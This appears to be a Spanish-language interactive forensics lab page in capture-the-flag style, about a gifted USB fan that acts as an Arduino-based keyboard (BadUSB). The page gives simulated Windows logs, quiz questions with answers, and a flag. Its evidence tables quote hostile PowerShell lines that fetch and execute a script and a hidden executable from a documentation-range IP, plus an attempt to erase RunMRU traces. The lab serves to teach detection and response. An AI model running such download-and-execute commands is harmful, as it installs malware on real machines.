@@ -1,0 +1,158 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>El ventilador que teclea solo · Labs N4zar1</title>
+<meta name="description" content="Reto de ataque BadUSB en Windows: un ventilador regalado que se presenta como teclado. Revisa los eventos 6416, los teclados conectados, RunMRU y PowerShell, y descubre qué escribió.">
+<meta name="theme-color" content="#040a1c">
+<link rel="icon" type="image/png" href="../assets/favicon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,800&family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@500;700&display=swap">
+<link rel="stylesheet" href="../assets/lab.css">
+<style>.evidence h3{margin:0;font:inherit}</style>
+</head>
+<body>
+<div class="wrap">
+  <header class="top">
+    <a class="brand" href="../index.html"><img class="b" src="../assets/avatar.jpg" alt="" width="40" height="40"><span><b>Laboratorios</b><span>LABS.N4ZAR1</span></span></a>
+    <nav><a href="../index.html">← Todos los labs</a></nav>
+  </header>
+
+  <span class="tag"><i></i>SIMULACIÓN · LABORATORIO</span>
+  <h1>🌀 El ventilador que teclea solo</h1>
+  <p class="lede">Medio · ~15 min · Basado en el vídeo «El ventilador USB que teclea solo».</p>
+
+  <div class="brief">
+    <p><b>El caso.</b> A recepción de Logística Duero, una empresa ficticia, llega una caja de regalo con una carta de «Atención al cliente» y un ventilador USB. Lucía lo enchufa en su PC el martes por la mañana. Durante un segundo se ve algo raro en la pantalla y luego nada. Al día siguiente, el firewall avisa de conexiones extrañas desde su equipo. Te pasa la salida de cuatro comandos de PowerShell.</p>
+    <p><b>Tu misión:</b> demuestra que el ventilador era un teclado, cuándo se enchufó, qué escribió y qué dejó instalado. Chuleta: cada aparato USB dice quién lo fabrica con su <code>VID</code> (por ejemplo, <code>VID_046D</code> es Logitech y <code>VID_2341</code>, Arduino). Pero tener «un teclado de más» no siempre es un ataque: mira también cuándo apareció.</p>
+  </div>
+
+  <div class="evidence" id="ev1">
+    <div class="hd"><h3>1 · Get-WinEvent -FilterHashtable @{LogName='Security'; Id=6416} (dispositivos nuevos)</h3>
+      <span class="tools"><select id="q1" aria-label="Filtrar por clase"><option value="">Cualquier clase</option><option>Keyboard</option><option>Mouse</option><option>DiskDrive</option><option>Monitor</option><option>HIDClass</option></select><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="evidence" id="ev2">
+    <div class="hd"><h3>2 · Get-PnpDevice -Class Keyboard -PresentOnly</h3>
+      <span class="tools"><input id="q2" placeholder="Buscar (nombre, VID…)" aria-label="Buscar en los teclados"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="evidence" id="ev3">
+    <div class="hd"><h3>3 · Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</h3>
+      <span class="tools"><input id="q3" placeholder="Buscar (comando…)" aria-label="Buscar en RunMRU"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="evidence" id="ev4">
+    <div class="hd"><h3>4 · Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' (Id 4104, 20/10)</h3>
+      <span class="tools"><input id="q4" placeholder="Buscar (hora, texto…)" aria-label="Buscar en los eventos de PowerShell"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="tasks" id="tasks"></div>
+
+  <div class="win" id="win">
+    <h2>✓ Reto completado</h2>
+    <p>Bandera: <code id="flag"></code></p>
+    <p>Lo que haría un analista: desenchufar el ventilador y guardarlo como prueba (sin conectarlo en otro equipo), sacar el PC de Lucía de la red, capturas de los eventos 6416, de RunMRU y de PowerShell, bloquear 203.0.113.7 en el firewall, buscar <code>VID_2341</code> en el resto de equipos y avisar a seguridad: si la caja llegó a recepción, puede que haya más. Y en adelante, que ningún aparato USB regalado se enchufe en un PC de la empresa.</p>
+    <button class="btn ghost" id="reset">Reiniciar el reto</button>
+  </div>
+
+  <footer class="foot"><span>Persona, empresa, aparatos, rutas e IP ficticios (203.0.113.0/24 es un rango de documentación). Por Nazarí · N4zar1</span><a href="../index.html">← Volver a los labs</a></footer>
+</div>
+<script src="../assets/lab.js"></script>
+<script>
+const $ = id => document.getElementById(id);
+const q = () => (r, v) => !v || r.join(' ').toLowerCase().includes(v.toLowerCase());
+
+makeTable({
+  el: $('ev1'),
+  cols: ['TimeCreated', 'DeviceDescription', 'ClassName', 'HardwareIds'],
+  rows: [
+    ['12/03/2026 09:41:05', 'Teclado HID estándar', 'Keyboard', 'HID\\VID_04F2&PID_B5C3 (teclado del portátil)'],
+    ['12/03/2026 09:41:06', 'Mouse compatible con HID', 'Mouse', 'HID\\VID_06CB&PID_CE26 (touchpad)'],
+    ['12/03/2026 10:20:44', 'Monitor PnP genérico', 'Monitor', 'MONITOR\\DEL41B8'],
+    ['04/05/2026 08:55:31', 'Logitech USB Unifying Receiver', 'HIDClass', 'USB\\VID_046D&PID_C52B'],
+    ['04/05/2026 08:55:32', 'Dispositivo de teclado HID', 'Keyboard', 'HID\\VID_046D&PID_C52B&MI_00'],
+    ['04/05/2026 08:55:32', 'Mouse compatible con HID', 'Mouse', 'HID\\VID_046D&PID_C52B&MI_01'],
+    ['15/10/2026 12:07:19', 'Kingston DataTraveler 3.0 USB Device', 'DiskDrive', 'USBSTOR\\Disk&Ven_Kingston&Prod_DataTraveler_3.0'],
+    ['20/10/2026 10:02:10', 'Dispositivo compuesto USB', 'HIDClass', 'USB\\VID_2341&PID_8036'],
+    ['20/10/2026 10:02:11', 'Dispositivo de teclado HID', 'Keyboard', 'HID\\VID_2341&PID_8036&MI_02'],
+  ],
+  filters: [{el: $('q1'), test: (r, v) => !v || r[2] === v}],
+});
+
+makeTable({
+  el: $('ev2'),
+  cols: ['Status', 'FriendlyName', 'InstanceId'],
+  rows: [
+    ['OK', 'Teclado HID estándar', 'HID\\VID_04F2&PID_B5C3\\7&1A2B3C4D&0&0000'],
+    ['OK', 'Dispositivo de teclado HID', 'HID\\VID_046D&PID_C52B&MI_00\\8&2F11A7E0&0&0000'],
+    ['OK', 'Dispositivo de teclado HID', 'HID\\VID_2341&PID_8036&MI_02\\8&3C90D215&0&0000'],
+  ],
+  filters: [{el: $('q2'), test: q()}],
+});
+
+makeTable({
+  el: $('ev3'),
+  cols: ['Entrada', 'Valor'],
+  rows: [
+    ['a', 'powershell -w hidden -c "iwr http://203.0.113.7/a.ps1 | iex"\\1'],
+    ['b', 'notepad\\1'],
+    ['c', '\\\\nas-duero\\recepcion\\1'],
+    ['d', 'calc\\1'],
+    ['e', 'mstsc\\1'],
+    ['MRUList', 'abdce'],
+  ],
+  filters: [{el: $('q3'), test: q()}],
+});
+
+makeTable({
+  el: $('ev4'),
+  cols: ['TimeCreated', 'Id', 'ScriptBlockText (resumen)'],
+  rows: [
+    ['20/10/2026 08:47:02', '4104', 'Import-Module PSReadLine (perfil de PowerShell de Lucía)'],
+    ['20/10/2026 10:02:13', '4104', 'iwr http://203.0.113.7/a.ps1 | iex'],
+    ['20/10/2026 10:02:14', '4104', '$p = "$env:APPDATA\\Duero\\svc.exe"; iwr http://203.0.113.7/svc.exe -OutFile $p'],
+    ['20/10/2026 10:02:15', '4104', 'Start-Process $p -WindowStyle Hidden'],
+    ['20/10/2026 10:02:15', '4104', 'Remove-ItemProperty HKCU:\\...\\RunMRU -Name * (falla: clave en uso)'],
+    ['20/10/2026 13:30:00', '4104', 'Get-ChildItem \\\\nas-duero\\recepcion (copia de seguridad de IT)'],
+  ],
+  filters: [{el: $('q4'), test: q()}],
+});
+
+runLab('ventilador-teclado', [
+  {q: 'Según los eventos 6416, ¿de qué fabricante es el «teclado» que apareció el 20/10? (escribe su VID)', type: 'text', ph: 'VID_XXXX',
+   accept: a => norm(a).replace(/[^0-9a-z]/g, '').includes('2341'),
+   hint: 'Filtra por Keyboard y mira la fecha más reciente.',
+   explain: '<b>VID_2341</b>, que es Arduino. Y el <code>PID_8036</code> es un Arduino Leonardo, una placa con un chip (ATmega32U4) que puede decirle a Windows que es un teclado. Un ventilador no necesita ser un teclado para nada.'},
+  {q: '¿A qué hora exacta lo reconoció Windows como teclado?', type: 'text', ph: 'hh:mm:ss',
+   accept: a => a.replace(/[^0-9]/g, '').includes('100211'),
+   explain: '<b>10:02:11</b>. Un segundo antes aparece como «Dispositivo compuesto USB»: el mismo aparato se presenta con varias caras, y una de ellas es un teclado.'},
+  {q: 'También hay un teclado Logitech de más (VID_046D). ¿Es parte del ataque?', type: 'choice',
+   options: ['Sí: cualquier teclado de más es un ataque', 'No: es el receptor Unifying del teclado inalámbrico, conectado en mayo, meses antes del regalo', 'No se puede saber'], correct: 1,
+   wrong: '✗ Mira cuándo apareció y qué más llegó con él.',
+   explain: 'Es el <b>receptor inalámbrico de Logitech</b>: un solo pincho USB que trae teclado y ratón, conectado el 04/05/2026. Tener dos teclados es normal si usas uno inalámbrico. Lo que delata al ventilador es el fabricante (Arduino) y que apareció justo cuando se enchufó el regalo.'},
+  {q: '¿Desde qué IP descargó el script?', type: 'text', ph: 'IP',
+   accept: a => a.replace(/\s/g, '') === '203.0.113.7',
+   hint: 'Está en la entrada «a» de RunMRU.',
+   explain: '<b>203.0.113.7</b>. RunMRU guarda lo que se escribe en Windows + R. El «ventilador» pulsó Win + R y tecleó el comando entero, así que quedó guardado como si lo hubiera escrito Lucía.'},
+  {q: '¿Cuántos segundos pasan entre que Windows lo reconoce como teclado y la primera orden de PowerShell?', type: 'text', ph: 'Segundos',
+   accept: a => a.replace(/[^0-9]/g, '') === '2',
+   explain: '<b>2 segundos</b> (10:02:11 → 10:02:13). Nadie escribe un comando de 60 caracteres en dos segundos. Esa velocidad es la firma de un teclado automático.'},
+  {q: '¿Qué programa dejó instalado en el PC? (nombre del archivo)', type: 'text', ph: 'Archivo',
+   accept: a => norm(a).includes('svc'),
+   hint: 'Mira qué descarga el script a las 10:02:14.',
+   explain: '<b>svc.exe</b>, en <code>AppData\\Roaming\\Duero</code>, lanzado oculto. Es el que hace las conexiones que vio el firewall. El script intentó borrar RunMRU para tapar su rastro, pero falló.'},
+  {q: '¿Qué harías primero?', type: 'choice',
+   options: ['Desenchufar el ventilador, sacar el PC de la red, guardar pruebas y avisar a seguridad', 'Borrar svc.exe y seguir trabajando', 'Probar el ventilador en otro PC para ver si vuelve a pasar'], correct: 0,
+   explain: '<b>Desenchufar, aislar, pruebas y avisar.</b> Si solo borras svc.exe, no sabes qué más hizo. Si lo pruebas en otro PC, infectas otro. Y si la caja llegó a recepción, puede haber llegado a más compañeros. Si eres un particular, el 017 de INCIBE te ayuda.'},
+], 'N4{el_ventilador_era_un_teclado}');
+</script>
+<script data-goatcounter="https://n4zar1.goatcounter.com/count" async src="https://gc.zgo.at/count.js"></script>
+</body>
+</html>
